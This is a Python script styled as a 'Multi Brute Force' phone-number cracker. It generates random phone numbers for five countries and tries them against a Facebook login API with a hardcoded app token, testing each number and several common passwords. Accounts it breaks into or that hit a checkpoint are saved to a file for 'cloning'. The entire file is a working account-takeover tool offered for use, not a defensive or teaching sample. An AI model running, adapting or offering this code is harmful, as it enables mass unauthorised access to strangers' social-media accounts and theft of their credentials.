#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib.request,urllib.parse,urllib.error,getpass,requests,mechanize
import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
import premium3
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import date
from datetime import datetime

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
bm = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999) 
    sys.stdout = open('.txt', 'a')
    print(nmbr)
    sys.stdout.flush()

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
session = requests.Session()
session.headers.update({'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'})

back = 0
oks = []
cps = []
id = []
vulnot = ("\033[31mNot Vuln")
vuln = ("\033[32mVuln")

def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

def menunum():
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Crack Phone Number"+k+" ]"+p))
    print((k+"\n["+p+"1"+k+"]"+p+" Indonesia"))
    print((k+"["+p+"2"+k+"]"+p+" Bangladesh"))
    print((k+"["+p+"3"+k+"]"+p+" India"))
    print((k+"["+p+"4"+k+"]"+p+" Pakistan"))
    print((k+"["+p+"5"+k+"]"+p+" USA"))
    print((k+"["+p+"0"+k+"]"+p+" Back"))
    exit(pilihnum())
    
def pilihnum():
    cm=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
    if cm in[""]:
        print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
        exit(premium3.menu())
    elif cm in["1","01"]: #INDONESIA
        print((k+"\n[ "+p+"Set Phone Number"+k+" ]"+p))
        print((k+"["+p+"•"+k+"]"+p+" Telkomsel : 12x,13x,21x,22x,23x,52x"))
        print((k+"["+p+"•"+k+"]"+p+" XL        : 17x,18x,19x,59x,77x,78x"))
        print((k+"["+p+"•"+k+"]"+p+" Indosat   : 14x,15x,16x,56x,57x,58x"))
        print((k+"["+p+"•"+k+"]"+p+" Axis      : 31x,32x,33x,38x,"))
        try:
            c = input(k+"["+p+"•"+k+"]"+p+" Set Number : ")
            o = ("+628")
            idlist = ('.txt')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            input(k+"\n[ "+p+"Back"+k+" ]"+p)
            menunum()
    elif cm in["2","02"]: #BANGLADESH
        print((k+"\n[ "+p+"Set Phone Number"+k+" ]"+p))
        print((k+"["+p+"•"+k+"]"+p+" 150 To 660"))
        try:
            c = input(k+"["+p+"•"+k+"]"+p+" Set Number : ")
            o = ("+880")
            idlist = ('.txt')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            input(k+"\n[ "+p+"Back"+k+" ]"+p)
            menunum()
    elif cm in["3","03"]: #INDIA
        print((k+"\n[ "+p+"Set Phone Number"+k+" ]"+p))
        print((k+"["+p+"•"+k+"]"+p+" 905,975,755,855,954,897"))
        print((k+"["+p+"•"+k+"]"+p+" 967,937,700,727,965,786"))
        print((k+"["+p+"•"+k+"]"+p+" 874,856,566,590,568,578"))
        try:
            c = input(k+"["+p+"•"+k+"]"+p+" Set Number : ")
            o = ("+91")
            idlist = ('.txt')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            input(k+"\n[ "+p+"Back"+k+" ]"+p)
            menunum()
    elif cm in["4","04"]: #PAKISTAN
        print((k+"\n[ "+p+"Set Phone Number"+k+" ]"+p))
        print((k+"["+p+"•"+k+"]"+p+" 00 To 50"))
        try:
            c = input(k+"["+p+"•"+k+"]"+p+" Set Number : ")
            o = ("+923")
            idlist = ('.txt')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            input(k+"\n[ "+p+"Back"+k+" ]"+p)
            menunum()
    elif cm in["5","05"]: #USA
        print((k+"\n[ "+p+"Set Phone Number"+k+" ]"+p))
        print((k+"["+p+"•"+k+"]"+p+" 555,786,815,315,256,401"))
        print((k+"["+p+"•"+k+"]"+p+" 718,917,202,701,303,703"))
        print((k+"["+p+"•"+k+"]"+p+" 803,708,559,310,809,551"))
        try:
            c = input(k+"["+p+"•"+k+"]"+p+" Set Number : ")
            o = ("+1")
            idlist = ('.txt')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
            input(k+"\n[ "+p+"Back"+k+" ]"+p)
            menunum()
    elif cm in["0","00"]:
        exit(premium3.menu())
    else:
        print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
        exit(premium3.menu())
    print((k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n"))
    def main(arg):
        global cps,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass1)))
                ok = open('save/cloned.txt', 'a')
                ok.write(o+c+user+pass1+'\n')
                ok.close()
                oks.append(o+c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass1)))
                    cp = open('save/cloned.txt', 'a')
                    cp.write(o+c+user+pass1+'\n')
                    cp.close()
                    cps.append(o+c+user+pass1)
                else:
                    pass2 = ("sayang")
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass2)))
                        ok = open('save/cloned.txt', 'a')
                        ok.write(o+c+user+pass2+'\n')
                        ok.close()
                        oks.append(o+c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass2)))
                            cp = open('save/cloned.txt', 'a')
                            cp.write(o+c+user+pass2+'\n')
                            cp.close()
                            cps.append(o+c+user+pass2)
                        else:
                            pass3 = ("anjing")
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass3)))
                                ok = open('save/cloned.txt', 'a')
                                ok.write(o+c+user+pass3+'\n')
                                ok.close()
                                oks.append(o+c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass3)))
                                    cp = open('save/cloned.txt', 'a')
                                    cp.write(o+c+user+pass3+'\n')
                                    cp.close()
                                    cps.append(o+c+user+pass3)
                                else:
                                    pass4 = ("786786")
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass4)))
                                        ok = open('save/cloned.txt', 'a')
                                        ok.write(o+c+user+pass4+'\n')
                                        ok.close()
                                        oks.append(o+c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass4)))
                                            cp = open('save/cloned.txt', 'a')
                                            cp.write(o+c+user+pass4+'\n')
                                            cp.close()
                                            cps.append(o+c+user+pass4)
                                        else:
                                            pass5 = ("000786")
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass5)))
                                                ok = open('save/cloned.txt', 'a')
                                                ok.write(o+c+user+pass5+'\n')
                                                ok.close()
                                                oks.append(o+c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass5)))
                                                    cp = open('save/cloned.txt', 'a')
                                                    cp.write(o+c+user+pass5+'\n')
                                                    cp.close()
                                                    cps.append(o+c+user+pass5)
                                                else:
                                                    pass6 = ("123456")
                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +o+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print(("\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s%s%s • %s "%(o,c,user,pass6)))
                                                        ok = open('save/cloned.txt', 'a')
                                                        ok.write(o+c+user+pass6+'\n')
                                                        ok.close()
                                                        oks.append(o+c+user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print(("\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s%s%s • %s "%(o,c,user,pass6)))
                                                            cp = open('save/cloned.txt', 'a')
                                                            cp.write(o+c+user+pass6+'\n')
                                                            cp.close()
                                                            cps.append(o+c+user+pass6)

        except:
            pass

    zz = ThreadPool(30)
    zz.map(main, id)
    print((k+"\n[ "+p+"Process Has Been Completed"+k+" ]"+p))
    print((k+"["+p+"•"+k+"]"+p+" OK/CP : "+str(len(oks))+"/"+str(len(cpb))))
    print((k+"["+p+"•"+k+"]"+p+" Result Saved To 👉 "+k+"[ "+p+"save/cloned.txt"+k+" ]"+p))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menunum()

if __name__ == '__main__':
    menunum()
